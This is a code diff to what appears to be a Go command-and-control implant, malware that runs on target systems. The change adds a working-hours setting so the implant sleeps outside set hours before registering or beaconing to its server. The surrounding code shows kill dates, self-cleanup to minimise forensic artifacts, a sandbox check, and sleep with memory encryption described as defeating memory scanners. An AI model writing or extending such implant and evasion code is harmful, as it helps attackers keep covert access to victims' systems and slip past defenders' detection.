@@ -12,15 +12,16 @@ import (
 
 // chdir and getwd wrappers for cross-platform compatibility.
 func chdir(path string) error { return os.Chdir(path) }
-func getwd() (string, error) { return os.Getwd() }
+func getwd() (string, error)  { return os.Getwd() }
 
 // Implant is the core agent that runs on target systems.
 type Implant struct {
-	transport *Transport
-	sleep     int
-	jitter    int
-	killDate  string
-	results   []protocol.TaskResult
+	transport   *Transport
+	sleep       int
+	jitter      int
+	killDate    string
+	workingTime string
+	results     []protocol.TaskResult
 }
 
 // selfCleanup performs cleanup on kill/kill-date to minimize forensic artifacts.
@@ -51,10 +52,11 @@ func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, ki
 	}
 
 	imp := &Implant{
-		transport: NewTransport(urls, serverPub),
-		sleep:     sleepSec,
-		jitter:    jitterPct,
-		killDate:  killDate,
+		transport:   NewTransport(urls, serverPub),
+		sleep:       sleepSec,
+		jitter:      jitterPct,
+		killDate:    killDate,
+		workingTime: WorkingTime,
 	}
 
 	// Sandbox check
@@ -81,6 +83,10 @@ func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, ki
 			return
 		}
 
+		if CheckWorkingTime(imp.workingTime) {
+			SleepUntilWorkingHours(imp.workingTime)
+		}
+
 		err := imp.transport.Register(sysinfo)
 		if err == nil {
 			break
@@ -97,6 +103,10 @@ func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, ki
 			// Kill date passed — self-destruct
 			selfCleanup()
 			return
+		}
+
+		if CheckWorkingTime(imp.workingTime) {
+			SleepUntilWorkingHours(imp.workingTime)
 		}
 
 		// Sleep with memory encryption (defeats memory scanners)
@@ -124,6 +134,9 @@ func Run(serverURL string, serverPub *rsa.PublicKey, sleepSec, jitterPct int, ki
 				for {
 					if CheckKillDate(imp.killDate) {
 						return
+					}
+					if CheckWorkingTime(imp.workingTime) {
+						SleepUntilWorkingHours(imp.workingTime)
 					}
 					if rerr := imp.transport.Register(sysinfo); rerr == nil {
 						break
